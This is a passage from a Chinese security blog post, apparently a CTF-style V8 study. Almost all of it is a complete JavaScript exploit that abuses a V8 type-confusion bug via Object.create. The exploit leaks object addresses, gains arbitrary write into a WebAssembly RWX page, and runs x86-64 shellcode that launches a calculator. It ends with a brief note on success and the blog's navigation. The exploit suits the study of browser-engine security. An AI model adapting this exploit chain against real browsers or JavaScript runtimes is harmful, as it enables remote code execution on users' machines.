class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> i32 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f_to_i</span>(<span class="params">target</span>)</span><br><span class="line">&#123;</span><br><span class="line">	f64[<span class="number">0</span>] = target;</span><br><span class="line">	<span class="keyword">let</span> tmp = <span class="title class_">Array</span>.<span class="title function_">from</span>(i32);</span><br><span class="line">	<span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>]; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i_to_f</span>(<span class="params">target</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">let</span> tmp = [];</span><br><span class="line">	tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(target % <span class="number">0x100000000</span>);</span><br><span class="line">	tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((target-tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">	i32.<span class="title function_">set</span>(tmp);</span><br><span class="line">	<span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">target</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> target.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;((<span class="number">1024</span> * <span class="number">1024</span>)/<span class="number">0x10</span>);i++)</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">var</span> a= <span class="keyword">new</span> <span class="title class_">String</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">create</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;<span class="attr">a</span>:<span class="number">123</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;<span class="number">30</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="string">`obj.<span class="subst">$&#123;<span class="string">&#x27;b&#x27;</span>+i&#125;</span> = 456-i`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj_array=[];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*function triggerVul(obj)&#123;</span></span><br><span class="line"><span class="comment">    obj.a;</span></span><br><span class="line"><span class="comment">    this.Object.create(obj);</span></span><br><span class="line"><span class="comment">    eval(`</span></span><br><span class="line"><span class="comment">    $&#123;find_obj.map((b) =&gt; `let $&#123;b&#125; = obj.$&#123;b&#125;;`).join(&#x27;\n&#x27;)&#125;</span></span><br><span class="line"><span class="comment">    `);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">find</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;<span class="number">40</span>;i++)&#123;</span><br><span class="line">        obj_array[i] = <span class="string">&#x27;b&#x27;</span>+i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        function triggerVul(obj)&#123;</span></span><br><span class="line"><span class="string">            obj.a;</span></span><br><span class="line"><span class="string">            this.Object.create(obj);</span></span><br><span class="line"><span class="string">            <span class="subst">$&#123;obj_array.map(</span></span></span><br><span class="line"><span class="subst"><span class="string">	    (b) =&gt; <span class="string">`let <span class="subst">$&#123;b&#125;</span> = obj.<span class="subst">$&#123;b&#125;</span>;`</span></span></span></span><br><span class="line"><span class="subst"><span class="string">	    ).join(<span class="string">&#x27;\n&#x27;</span>)&#125;</span></span></span><br><span class="line"><span class="string">            return [<span class="subst">$&#123;obj_array.join(<span class="string">&#x27;, &#x27;</span>)&#125;</span>];</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    `</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;<span class="number">10000</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">let</span> obj = <span class="title function_">create</span>();</span><br><span class="line">        <span class="keyword">let</span> array = <span class="title function_">triggerVul</span>(obj);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">0</span>;j&lt;array.<span class="property">length</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(array[j]!=<span class="number">456</span>-j&amp;&amp;array[j]&lt;<span class="number">456</span>&amp;&amp;array[j]&gt;(<span class="number">456</span>-<span class="number">39</span>))&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\033[1;32m[*] find two : \033[0m&quot;</span>+<span class="string">&#x27;b&#x27;</span>+j+<span class="string">&quot; and &quot;</span>+<span class="string">&#x27;b&#x27;</span>+(<span class="number">456</span>-array[j]));</span><br><span class="line">                <span class="keyword">return</span> [<span class="string">&#x27;b&#x27;</span>+j , <span class="string">&#x27;b&#x27;</span> + (<span class="number">456</span>-array[j])];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable constant_">C1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable constant_">C2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">leak_obj_create</span>(<span class="params">target</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> obj = &#123;<span class="attr">a</span>:<span class="number">123</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt;<span class="number">30</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="string">&#x27;b&#x27;</span>+i!=<span class="variable constant_">C1</span>&amp;&amp;<span class="string">&#x27;b&#x27;</span>+i!=<span class="variable constant_">C2</span>)&#123;</span><br><span class="line">			<span class="built_in">eval</span>(<span class="string">`obj.<span class="subst">$&#123;<span class="string">&#x27;b&#x27;</span>+i&#125;</span> = 1.1;`</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;b&#x27;</span>+i==<span class="variable constant_">C1</span>)&#123;</span><br><span class="line">			<span class="built_in">eval</span>(<span class="string">`obj.<span class="subst">$&#123;C1&#125;</span> = &#123;c10:1.1,c11:2.2&#125;;`</span>);</span><br><span class="line">			<span class="comment">//eval(`obj.$&#123;C1&#125; = 1.1;`)</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;b&#x27;</span>+i==<span class="variable constant_">C2</span>)&#123;</span><br><span class="line">			<span class="built_in">eval</span>(<span class="string">`obj.<span class="subst">$&#123;C2&#125;</span> = &#123;c20:target&#125;;`</span>);</span><br><span class="line">			<span class="comment">//eval(`obj.$&#123;C2&#125; = target;`)</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">leak</span>(<span class="params">target</span>)&#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        function triggerVul(target)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">        target.a;</span></span><br><span class="line"><span class="string">        this.Object.create(target);</span></span><br><span class="line"><span class="string">        return target.<span class="subst">$&#123;C1&#125;</span>.c10;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">                `</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt;<span class="number">10000</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">var</span> obj = <span class="title function_">leak_obj_create</span>(target);</span><br><span class="line">		<span class="keyword">var</span> leak_addr = <span class="title function_">triggerVul</span>(obj);</span><br><span class="line">		<span class="keyword">if</span>(leak_addr!=<span class="number">1.1</span>&amp;&amp;leak_addr!=<span class="literal">undefined</span>)&#123;</span><br><span class="line">			 <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\033[1;32m[*] target addr is leaked: \033[0m &quot;</span> + (<span class="title function_">f_to_i</span>(leak_addr)));</span><br><span class="line">			 <span class="keyword">return</span> <span class="title function_">f_to_i</span>(leak_addr);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write_obj_create</span>(<span class="params">target</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> obj = &#123;<span class="attr">a</span>:<span class="number">123</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt;<span class="number">30</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="string">&#x27;b&#x27;</span>+i!=<span class="variable constant_">C1</span>&amp;&amp;<span class="string">&#x27;b&#x27;</span>+i!=<span class="variable constant_">C2</span>)&#123;</span><br><span class="line">                        <span class="built_in">eval</span>(<span class="string">`obj.<span class="subst">$&#123;<span class="string">&#x27;b&#x27;</span>+i&#125;</span> = &#123;&#125;;`</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;b&#x27;</span>+i==<span class="variable constant_">C1</span>)&#123;</span><br><span class="line">                        <span class="built_in">eval</span>(<span class="string">`obj.<span class="subst">$&#123;C1&#125;</span> = &#123;c10:&#123;c11:1.1,c12:2.2&#125;&#125;;`</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;b&#x27;</span>+i==<span class="variable constant_">C2</span>)&#123;</span><br><span class="line">                        <span class="built_in">eval</span>(<span class="string">`obj.<span class="subst">$&#123;C2&#125;</span> = &#123;c20:target&#125;;`</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">target,data</span>)&#123;</span><br><span class="line">	<span class="built_in">eval</span>(<span class="string">`</span></span><br><span class="line"><span class="string">	function triggerVul(target,data)&#123;</span></span><br><span class="line"><span class="string">		target.a;</span></span><br><span class="line"><span class="string">		this.Object.create(target);</span></span><br><span class="line"><span class="string">		let sign = target.<span class="subst">$&#123;C1&#125;</span>.c10.c12;</span></span><br><span class="line"><span class="string">		target.<span class="subst">$&#123;C1&#125;</span>.c10.c12 = (data);</span></span><br><span class="line"><span class="string">		return sign;</span></span><br><span class="line"><span class="string">	&#125;	</span></span><br><span class="line"><span class="string">		`</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt;<span class="number">10000</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">var</span> obj = <span class="title function_">write_obj_create</span>(target);</span><br><span class="line">                <span class="keyword">var</span> sign = <span class="title function_">triggerVul</span>(obj,data);</span><br><span class="line">		<span class="keyword">if</span>(sign!=<span class="number">2.2</span>)&#123;</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\033[1;32m[*] target addr has been write with data: \033[0m &quot;</span> + <span class="title function_">f_to_i</span>(data));</span><br><span class="line">			<span class="keyword">return</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\033[1;31m[!]Failed to Write Data! \033[0m &quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="variable constant_">C1</span>,<span class="variable constant_">C2</span>] = <span class="title function_">find</span>();</span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> wasm = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">wasm</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_addr = <span class="title function_">leak</span>(wasm);</span><br><span class="line"><span class="title function_">write</span>(buffer,<span class="title function_">i_to_f</span>(wasm_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="title class_">DataView</span>(buffer);</span><br><span class="line">shared_info = <span class="title function_">f_to_i</span>(dataview.<span class="title function_">getFloat64</span>(<span class="number">0x18</span>-<span class="number">0x1</span>,<span class="literal">true</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\033[1;32m[*] shared info addr is leaked: \033[0m &quot;</span> + (shared_info));</span><br><span class="line"></span><br><span class="line"><span class="title function_">write</span>(buffer,<span class="title function_">i_to_f</span>((shared_info)));</span><br><span class="line"><span class="title class_">WasmFunc</span> = <span class="title function_">f_to_i</span>(dataview.<span class="title function_">getFloat64</span>(<span class="number">0x8</span>-<span class="number">0x1</span>,<span class="literal">true</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\033[1;32m[*] wasm Func addr is leaked: \033[0m &quot;</span> + (<span class="title class_">WasmFunc</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_">write</span>(buffer,<span class="title function_">i_to_f</span>(<span class="title class_">WasmFunc</span>));</span><br><span class="line"><span class="title class_">Instance</span> = <span class="title function_">f_to_i</span>(dataview.<span class="title function_">getFloat64</span>(<span class="number">0x10</span>-<span class="number">0x1</span>,<span class="literal">true</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\033[1;32m[*] wasm Instance addr is leaked: \033[0m &quot;</span> + (<span class="title class_">Instance</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_">write</span>(buffer,<span class="title function_">i_to_f</span>(<span class="title class_">Instance</span>));</span><br><span class="line">wasm_rwx = <span class="title function_">f_to_i</span>(dataview.<span class="title function_">getFloat64</span>(<span class="number">0xe8</span>+<span class="number">0x8</span>-<span class="number">0x1</span>,<span class="literal">true</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\033[1;32m[*] wasm rwx addr is leaked: \033[0m &quot;</span> + (wasm_rwx));</span><br><span class="line"></span><br><span class="line"><span class="title function_">write</span>(buffer,<span class="title function_">i_to_f</span>(wasm_rwx));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">46</span>, <span class="number">121</span>, <span class="number">98</span>,</span><br><span class="line"><span class="number">96</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">98</span>,</span><br><span class="line"><span class="number">105</span>, <span class="number">110</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">104</span>, <span class="number">59</span>, <span class="number">49</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">129</span>, <span class="number">52</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line"><span class="number">72</span>, <span class="number">184</span>, <span class="number">68</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">80</span>, <span class="number">76</span>, <span class="number">65</span>, <span class="number">89</span>, <span class="number">61</span>, <span class="number">80</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">82</span>, <span class="number">106</span>, <span class="number">8</span>, <span class="number">90</span>,</span><br><span class="line"><span class="number">72</span>, <span class="number">1</span>, <span class="number">226</span>, <span class="number">82</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">226</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>,</span><br><span class="line"><span class="number">184</span>, <span class="number">121</span>, <span class="number">98</span>, <span class="number">96</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">86</span>, <span class="number">106</span>, <span class="number">8</span>,</span><br><span class="line"><span class="number">94</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">230</span>, <span class="number">86</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">230</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">15</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;shellcode.<span class="property">length</span>;i++)&#123;</span><br><span class="line">	dataview.<span class="title function_">setUint8</span>(i,shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">wasm</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//%DebugPrint(buffer);</span></span><br><span class="line"><span class="comment">//%DebugPrint(wasm);</span></span><br><span class="line"><span class="comment">//%DebugPrint(shared_info);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br></pre></td></tr></table></figure>

<p>成功弹出计算器(跑起来慢的离谱，因为循环太多了，直接用<code>%OptimizeOnNextCall</code>来触发应该也行，我没试)：</p>
<img src="/posts/f54b4e18/4.png" class=""></li>
</ul>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/posts/c3fa513f/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            语法分析器(Parser)的实现
          
        </div>
      </a>
    
    
      <a href="/posts/4afbca67/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">初识v8之starctf2019-oob</div>
      </a>
    
  </nav>

  
   
  
   
    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
    <div id="twikoo" class="twikoo"></div>
    <script>
        twikoo.init({
            envId: ""
        })
    </script>
 
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2022-2023
        <i class="ri-heart-fill heart_icon"></i> h1J4cker
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/h1J4cker.svg" alt="h1J4cker&#39;s Blog"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends">友链</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">关于</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->
 
<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: ".tocbot",
    contentSelector: ".article-entry",
    headingSelector: "h1, h2, h3, h4, h5, h6",
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: "main",
    positionFixedSelector: ".tocbot",
    positionFixedClass: "is-position-fixed",
    fixedSidebarOffset: "auto",
  });
</script>

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

